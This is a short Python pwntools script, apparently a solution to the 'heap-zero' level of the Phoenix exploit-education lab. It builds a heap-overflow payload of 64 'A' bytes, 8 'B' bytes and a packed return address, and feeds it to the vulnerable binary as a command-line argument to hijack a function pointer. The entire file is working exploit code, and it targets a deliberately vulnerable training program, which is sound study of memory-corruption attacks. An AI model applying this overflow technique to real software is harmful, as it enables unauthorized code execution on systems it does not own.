from pwn import *


arch = "i486"


def run(level, payload):
    write("/tmp/docgil", payload)
    print("payload: ")
    print(read("/tmp/docgil"))
    io = process("cat /tmp/docgil  | /opt/phoenix/" + arch + "/"+level, shell=True)
    return io.recvall()


def run_with_arg(level, arg):
    write("/tmp/docgil", arg)
    print("payload: ")
    print(read("/tmp/docgil"))
    io = process("/opt/phoenix/" + arch + "/"+level+" \"`cat /tmp/docgil`\"", shell=True)
    return io.recvall()


adr = pack(0x08048835, 32)
payload = b""
payload += 64*b"A"
payload += 8*b"B"
payload += adr

r = run_with_arg("heap-zero", payload)
print(r)